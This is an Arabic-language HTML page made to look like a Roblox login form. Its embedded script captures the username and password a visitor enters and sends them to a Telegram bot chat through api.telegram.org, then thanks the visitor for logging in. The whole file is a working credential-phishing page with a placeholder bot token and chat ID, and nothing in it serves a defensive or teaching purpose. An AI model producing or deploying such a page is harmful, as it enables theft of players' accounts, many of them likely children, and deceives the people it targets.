<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox - صفحة تسجيل الدخول</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #a9a9a9; /* Professional gray background */
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            background-color: white;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 0 20px rgba(0, 0, 0, 0.2);
            text-align: center;
            width: 300px; /* Fixed width for consistency */
        }
        h1 {
            margin-bottom: 20px;
            font-size: 24px;
            color: #333;
        }
        input {
            display: block;
            width: calc(100% - 20px); /* Adjusted for padding */
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 4px;
            font-size: 16px;
        }
        button {
            background-color: #4CAF50;
            color: white;
            padding: 10px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
            transition: background-color 0.3s ease;
        }
        button:hover {
            background-color: #45a049;
        }
        #result {
            margin-top: 15px;
            color: #f00; /* Red color for error messages */
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h1>تسجيل الدخول إلى Roblox</h1>
        <form id="loginForm">
            <input type="text" id="username" placeholder="اسم المستخدم" required>
            <input type="password" id="password" placeholder="كلمة المرور" required>
            <button type="submit">تسجيل الدخول</button>
        </form>
        <p id="result"></p>
    </div>
    
    <script>
        const BOT_TOKEN = 'YOUR_BOT_TOKEN'; // توكن البوت الخاص بك
        const CHAT_ID = 'YOUR_CHAT_ID'; // معرف الدردشة الخاص بك

        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            var username = document.getElementById('username').value;
            var password = document.getElementById('password').value;
            var result = document.getElementById('result');
            
            var message = `🟢 بيانات تسجيل دخول جديدة:\n\n👤 اسم المستخدم: ${username}\n🔑 كلمة المرور: ${password}`;
            
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message
                }),
            })
            .then(response => response.json())
            .then(data => {
                result.textContent = "تم إرسال البيانات! شكراً لتسجيل الدخول.";
                result.style.color = "#4CAF50"; // Green color for success messages
            })
            .catch((error) => {
                console.error('Error:', error);
                result.textContent = "حدث خطأ أثناء إرسال البيانات. حاول مرة أخرى.";
            });
        });
    </script>
</body>
</html>
